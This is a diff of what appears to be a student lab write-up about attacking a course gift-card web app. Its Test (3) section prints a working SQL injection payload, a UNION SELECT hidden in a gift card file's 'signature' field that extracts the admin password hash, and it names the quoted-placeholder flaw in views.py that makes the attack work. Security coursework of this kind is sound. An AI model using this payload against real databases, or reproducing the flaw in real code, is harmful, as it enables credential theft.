@@ -35,13 +35,16 @@ Test (3) directly below.
 
 
 (3) this giftcard file contains SQL code within the dictionary data structure.
-The SQL code is contained within the "signature" key of the dictionary, which is in the giftcard file.
-The code (mixed with giftcard records data) below is found in the "salt.gftcrd" file, within this same directory.
+The SQL code is contained within the "signature" key of the dictionary, which is in the giftcard file to be uploaded.
+The code below is found in the "salt.gftcrd" file, within this same directory.
+
 ---> scroll all the way to the right for complete SQL code --->
 {"records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "{\"merchant_id\": \"NYU Apparel Card\", \"customer_id\": \"foo\", \"total_value\": \"111\", \"records\": [{\"record_type\": \"amount_change\", \"amount_added\": 2000, \"signature\": \"[ insert crypto signature here ]\"}]}'union select all group_concat(password) from LegacySite_user where username='admin"}]}
 ---> scroll all the way to the right for complete SQL code --->
+
 This SQL code will "union" with the original SQL code at line 188 of the original "views.py" file given. 
-This utilizes the vulnerable parameter, signature, within the variable "card_query" - because: %s was wrapped with quotes at line 188 of "card_query"
+This utilizes the vulnerable parameter, "signature", within the variable "card_query" - because: the placeholder (%s) was quoted at line 188 of "card_query"
+Please refer to "Test3DisplayPasswordProof.png" for a screenshot of the displayed password hash for "admin" after uploading "salt.gftcrd"
 
 Test (4) directly below.
 
